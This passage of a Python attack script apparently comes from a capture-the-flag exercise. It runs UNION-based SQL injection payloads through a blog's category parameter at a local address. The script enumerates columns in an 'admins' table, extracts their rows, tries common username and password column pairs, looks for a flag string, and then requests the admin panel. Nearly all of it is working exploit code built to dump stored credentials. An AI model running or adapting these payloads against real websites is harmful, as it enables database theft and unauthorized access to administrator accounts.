    ('email', 'Testing for email column'),
    ('admin_user', 'Testing for admin_user column'),
    ('admin_pass', 'Testing for admin_pass column'),
    ('id', 'Testing for id column')
]

valid_columns = []

for column, description in column_tests:
    print(f"\n[+] {description}")
    payload = f"Nature' UNION SELECT {column} FROM admins LIMIT 1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    
    # Check if we get "No posts found" (success) or SQL error (failure)
    if "No posts found" in r.text:
        print(f"[!] Column '{column}' EXISTS in admins table")
        valid_columns.append(column)
    else:
        print(f"[-] Column '{column}' does not exist or query failed")

print(f"\n[!] VALID COLUMNS FOUND: {valid_columns}")

# Step 2: Extract actual data from each valid column
if valid_columns:
    print("\n[+] Step 2: Extracting data from valid columns")
    
    extracted_data = {}
    for column in valid_columns:
        print(f"\n[+] Extracting data from column: {column}")
        
        # Try to get multiple rows
        for row in range(5):  # Try first 5 rows
            payload = f"Nature' UNION SELECT {column} FROM admins LIMIT {row},1#"
            r = session.get(target + "?category=" + urllib.parse.quote(payload))
            
            # Clean the response
            text = re.sub(r'<[^>]+>', ' ', r.text)
            text = re.sub(r'\s+', ' ', text).strip()
            
            # Remove common page content
            exclude_phrases = ['No posts found', 'Admin Login', 'All Categories', 'Welcome to Our Blog', 'Choose a category', 
                              'Notice', 'Undefined variable', 'category in', 'var/www/html/index.php', 'Error in query']
            
            for phrase in exclude_phrases:
                text = text.replace(phrase, '')
            
            text = re.sub(r'\s+', ' ', text).strip()
            
            # Extract potential data (non-empty, not page structure)
            if text and len(text) > 3:
                # Look for words/values that aren't HTML structure
                words = re.findall(r'\b[a-zA-Z0-9._@-]+\b', text)
                
                # Filter out common words
                exclude_words = ['Nature','Tech','Cooking','Photography','Health','Blog','Home','Welcome','html','index','php','This','Form','Submit']
                data_words = [w for w in words if w not in exclude_words]
                
                if data_words:
                    value = ' '.join(data_words)
                    if column not in extracted_data:
                        extracted_data[column] = []
                    extracted_data[column].append(value)
                    print(f"[!] Row {row}: {column} = {value}")
    
    print(f"\n[!] EXTRACTED DATA:")
    for col, values in extracted_data.items():
        print(f"[!] {col}: {values}")
        
        # Check for flag in extracted data
        for val in values:
            if 'FLAG{' in val:
                print(f"\n[!] FLAG FOUND IN DATA: {val}")

# Step 3: Brute force common credential columns if none found yet
if not valid_columns:
    print("\n[+] Step 3: Brute-forcing common credential column combinations")
    
    common_pairs = [
        ('username', 'password'),
        ('user', 'pass'),
        ('email', 'password'),
        ('admin_user', 'admin_pass'),
        ('admin', 'password')
    ]
    
    for user_col, pass_col in common_pairs:
        print(f"\n[+] Testing pair: {user_col}, {pass_col}")
        
        # Test if both columns exist
        payload = f"Nature' UNION SELECT {user_col} FROM admins LIMIT 1#"
        r1 = session.get(target + "?category=" + urllib.parse.quote(payload))
        
        payload = f"Nature' UNION SELECT {pass_col} FROM admins LIMIT 1#"
        r2 = session.get(target + "?category=" + urllib.parse.quote(payload))
        
        if "No posts found" in r1.text and "No posts found" in r2.text:
            print(f"[!] Both columns exist! Attempting data extraction...")
            
            # Extract username
            username_data = extract_data('admins', user_col)
            # Extract password
            password_data = extract_data('admins', pass_col)
            
            print(f"[!] Credentials found:")
            print(f"[!] Username column ({user_col}): {username_data}")
            print(f"[!] Password column ({pass_col}): {password_data}")

# Step 4: Try to login with extracted credentials if we have them
print("\n[+] Step 4: Accessing admin panel")
admin_login_url = "http://127.0.0.1:32780/admin.php"

r = session.get(admin_login_url)
print(f"[+] Admin panel status: {r.status_code}")
print(f"[+] Admin panel response:\n{r.text[:500]}")

if "login" in r.text.lower() or "username" in r.text.lower():
    print("[!] Admin login page accessible")

print("\n"+"="*80)
print("EXTRACTION COMPLETE")
print("="*80)
